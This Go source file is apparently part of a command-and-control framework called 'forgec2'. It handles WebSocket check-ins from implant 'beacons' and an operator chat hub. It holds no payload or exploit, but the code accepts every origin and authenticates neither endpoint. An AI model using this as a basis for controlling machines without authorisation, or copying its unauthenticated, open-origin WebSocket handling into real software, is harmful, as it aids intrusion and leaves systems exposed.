package server

import (
	"encoding/json"
	"log/slog"
	"net/http"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"gorm.io/gorm"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  4096,
	WriteBufferSize: 4096,
	CheckOrigin: func(r *http.Request) bool {
		return true // Allow all origins for C2
	},
}

// WebSocketBeacon represents an active WebSocket beacon connection
type WebSocketBeacon struct {
	Conn      *websocket.Conn
	AgentID   string
	LastSeen  time.Time
	Send      chan []byte
	closeOnce sync.Once
}

// WebSocketHub manages all active WebSocket beacon connections
type WebSocketHub struct {
	beacons map[string]*WebSocketBeacon
	mu      sync.RWMutex
}

func NewWebSocketHub() *WebSocketHub {
	return &WebSocketHub{
		beacons: make(map[string]*WebSocketBeacon),
	}
}

func (h *WebSocketHub) Register(agentID string, beacon *WebSocketBeacon) {
	h.mu.Lock()
	defer h.mu.Unlock()
	h.beacons[agentID] = beacon
}

func (h *WebSocketHub) Unregister(agentID string) {
	h.mu.Lock()
	defer h.mu.Unlock()
	if beacon, exists := h.beacons[agentID]; exists {
		beacon.closeOnce.Do(func() {
			close(beacon.Send)
		})
		delete(h.beacons, agentID)
	}
}

func (h *WebSocketHub) Get(agentID string) *WebSocketBeacon {
	h.mu.RLock()
	defer h.mu.RUnlock()
	return h.beacons[agentID]
}

func (h *WebSocketHub) Broadcast(data []byte) {
	h.mu.RLock()
	defer h.mu.RUnlock()
	for _, beacon := range h.beacons {
		select {
		case beacon.Send <- data:
		default:
			// Channel full, skip
		}
	}
}

// handleWebSocketBeacon handles WebSocket beacon connections
func (s *Server) handleWebSocketBeacon(c *gin.Context) {
	conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		slog.Error("WebSocket upgrade failed", "error", err)
		return
	}

	agentID := c.Query("agent_id")
	if agentID == "" {
		agentID = uuid.New().String()
	}

	slog.Info("WebSocket beacon connected", "agent_id", agentID, "remote_addr", conn.RemoteAddr())

	beacon := &WebSocketBeacon{
		Conn:     conn,
		AgentID:  agentID,
		LastSeen: time.Now(),
		Send:     make(chan []byte, 256),
	}

	// Initialize WebSocket hub if not exists
	if s.wsHub == nil {
		s.wsHub = NewWebSocketHub()
	}
	s.wsHub.Register(agentID, beacon)

	// Start read and write pumps
	go s.wsWritePump(beacon)
	go s.wsReadPump(beacon)
}

func (s *Server) wsWritePump(beacon *WebSocketBeacon) {
	defer func() {
		beacon.Conn.Close()
		s.wsHub.Unregister(beacon.AgentID)
	}()

	// Heartbeat ticker (30 seconds)
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case message, ok := <-beacon.Send:
			if !ok {
				// Channel closed
				beacon.Conn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}

			beacon.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			w, err := beacon.Conn.NextWriter(websocket.TextMessage)
			if err != nil {
				slog.Error("WebSocket write error", "agent_id", beacon.AgentID, "error", err)
				return
			}
			w.Write(message)
			if err := w.Close(); err != nil {
				slog.Error("WebSocket close writer error", "agent_id", beacon.AgentID, "error", err)
				return
			}

		case <-ticker.C:
			// Send ping
			beacon.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if err := beacon.Conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				slog.Error("WebSocket ping error", "agent_id", beacon.AgentID, "error", err)
				return
			}
		}
	}
}

func (s *Server) wsReadPump(beacon *WebSocketBeacon) {
	defer func() {
		s.wsHub.Unregister(beacon.AgentID)
		beacon.Conn.Close()
	}()

	beacon.Conn.SetReadLimit(512 * 1024) // 512KB max message size
	beacon.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	beacon.Conn.SetPongHandler(func(string) error {
		beacon.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		beacon.LastSeen = time.Now()
		return nil
	})

	for {
		_, message, err := beacon.Conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				slog.Error("WebSocket read error", "agent_id", beacon.AgentID, "error", err)
			}
			break
		}

		// Parse beacon request
		var req beaconRequest
		if err := json.Unmarshal(message, &req); err != nil {
			slog.Error("WebSocket JSON parse error", "agent_id", beacon.AgentID, "error", err)
			continue
		}

		req.UUID = beacon.AgentID

		// Process beacon
		resp := s.processBeacon(req)

		// Send response
		respJSON, err := json.Marshal(resp)
		if err != nil {
			slog.Error("WebSocket response marshal error", "agent_id", beacon.AgentID, "error", err)
			continue
		}

		select {
		case beacon.Send <- respJSON:
		default:
			slog.Warn("WebSocket send channel full", "agent_id", beacon.AgentID)
		}
	}
}

// handleWebSocketChat handles WebSocket chat connections for operators
func (s *Server) handleWebSocketChat(c *gin.Context) {
	conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		slog.Error("Chat WebSocket upgrade failed", "error", err)
		return
	}

	userID := c.Query("user_id")
	if userID == "" {
		userID = "anonymous"
	}

	slog.Info("Chat WebSocket connected", "user_id", userID, "remote_addr", conn.RemoteAddr())

	// Initialize chat hub if not exists
	if s.chatHub == nil {
		s.chatHub = NewChatHub()
		go s.chatHub.Run()
	}

	client := &ChatClient{
		Hub:      s.chatHub,
		Conn:     conn,
		UserID:   userID,
		Send:     make(chan []byte, 256),
		JoinedAt: time.Now(),
		DB:       s.db,
	}

	s.chatHub.register <- client

	go client.writePump()
	go client.readPump()
}

// ChatHub manages WebSocket chat connections
type ChatHub struct {
	clients    map[*ChatClient]bool
	broadcast  chan []byte
	register   chan *ChatClient
	unregister chan *ChatClient
}

func NewChatHub() *ChatHub {
	return &ChatHub{
		clients:    make(map[*ChatClient]bool),
		broadcast:  make(chan []byte),
		register:   make(chan *ChatClient),
		unregister: make(chan *ChatClient),
	}
}

func (h *ChatHub) Run() {
	for {
		select {
		case client := <-h.register:
			h.clients[client] = true
		case client := <-h.unregister:
			if _, ok := h.clients[client]; ok {
				delete(h.clients, client)
				close(client.Send)
			}
		case message := <-h.broadcast:
			for client := range h.clients {
				select {
				case client.Send <- message:
				default:
					close(client.Send)
					delete(h.clients, client)
				}
			}
		}
	}
}

type ChatClient struct {
	Hub      *ChatHub
	Conn     *websocket.Conn
	UserID   string
	Send     chan []byte
	JoinedAt time.Time
	DB       *gorm.DB
}

func (c *ChatClient) readPump() {
	defer func() {
		c.Hub.unregister <- c
		c.Conn.Close()
	}()

	c.Conn.SetReadLimit(512 * 1024)
	c.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	c.Conn.SetPongHandler(func(string) error {
		c.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	for {
		_, message, err := c.Conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				slog.Error("Chat WebSocket read error", "user_id", c.UserID, "error", err)
			}
			break
		}

		// Parse chat message
		var chatMsg struct {
			Type    string `json:"type"`
			Message string `json:"message"`
			Channel string `json:"channel"`
		}
		if err := json.Unmarshal(message, &chatMsg); err != nil {
			slog.Error("Chat message parse error", "user_id", c.UserID, "error", err)
			continue
		}

		// Save to database
		dbMsg := db.ChatMessage{
			User:      c.UserID,
			Message:   chatMsg.Message,
			Channel:   chatMsg.Channel,
			CreatedAt: time.Now(),
		}
		if c.DB != nil {
			c.DB.Create(&dbMsg)
		}
		c.Hub.broadcast <- message
	}
}

func (c *ChatClient) writePump() {
	ticker := time.NewTicker(30 * time.Second)
	defer func() {
		ticker.Stop()
		c.Conn.Close()
	}()

	for {
		select {
		case message, ok := <-c.Send:
			c.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if !ok {
				c.Conn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}

			w, err := c.Conn.NextWriter(websocket.TextMessage)
			if err != nil {
				return
			}
			w.Write(message)
			if err := w.Close(); err != nil {
				return
			}

		case <-ticker.C:
			c.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if err := c.Conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		}
	}
}
